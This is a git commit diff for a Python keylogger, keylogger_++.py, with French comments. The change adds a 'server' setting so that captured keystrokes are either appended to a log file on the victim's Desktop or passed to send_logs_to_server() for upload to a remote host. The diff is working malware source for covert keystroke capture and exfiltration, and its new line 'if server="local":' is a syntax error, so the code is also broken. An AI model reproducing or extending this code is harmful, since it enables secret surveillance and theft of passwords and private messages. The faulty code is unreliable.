c5f26f7d9ca5bfbd7e5807f657969fde7bd50ec1
Frexium <41706570+Frexium@users.noreply.github.com>
2025-01-15 16:43:27 +0100

    Update keylogger_++.py
    Changed the way the log saving process works

--- keylogger_++.py
+++ keylogger_++.py
@@ -10,6 +10,7 @@ is_first_run = True  # pour vérifier s'il s'agit de la première itération
 #initialisation des variables
 log = ""
 path =  os.path.join(os.path.expanduser("~"), "Desktop/log.txt")
+server = "local" #put server address here, or "local" if saved locally
 
 def process_keys(key):
     global log, last_keypress_time, current_keys
@@ -45,25 +46,28 @@ def on_release(key):
 
 def report():
     global log, path, is_first_run
-
-    #vérifier si le fichier de log est vide ou pas
-    if is_first_run:
-            if os.path.exists(path) and os.path.getsize(path) > 0:
+    if server="local":
+        #vérifier si le fichier de log est vide ou pas
+        if is_first_run:
+                if os.path.exists(path) and os.path.getsize(path) > 0:
+                    with open(path, "a") as logfile:
+                        logfile.write("\n")  # sauter une ligne si le fichier n'est pas vide
+                        print("Fichier de log non vide, ajout nouvelle entrée")
+    
+                is_first_run = False  #assurer que cette action se produit qu'une seule fois
+    
+        if time.time() - last_keypress_time >= 15: #attend 15 secondes après la dernière frappe avant de sauvegarder dans le fichier de log
+            if log:
                 with open(path, "a") as logfile:
-                    logfile.write("\n")  # sauter une ligne si le fichier n'est pas vide
-                    print("Fichier de log non vide, ajout nouvelle entrée")
-
-            is_first_run = False  #assurer que cette action se produit qu'une seule fois
-
-    if time.time() - last_keypress_time >= 15: #attend 15 secondes après la dernière frappe avant de sauvegarder dans le fichier de log
-        if log:
-            with open(path, "a") as logfile:
-                logfile.write(log)
-                print("Rapport enregistré (inactivité de 15s)")
+                    logfile.write(log)
+                    print("Rapport enregistré (inactivité de 15s)")
+                log = ""
+                logfile.close()
+        threading.Timer(1, report).start()
+    else:
+        if time.time() - last_keypress_time >= 15: #attend 15 secondes après la dernière frappe avant de sauvegarder dans le fichier de log
+            if log:
                 send_logs_to_server()
-            log = ""
-            logfile.close()
-    threading.Timer(1, report).start()
 
 def send_logs_to_server():
     """Envoie les logs à un serveur distant."""
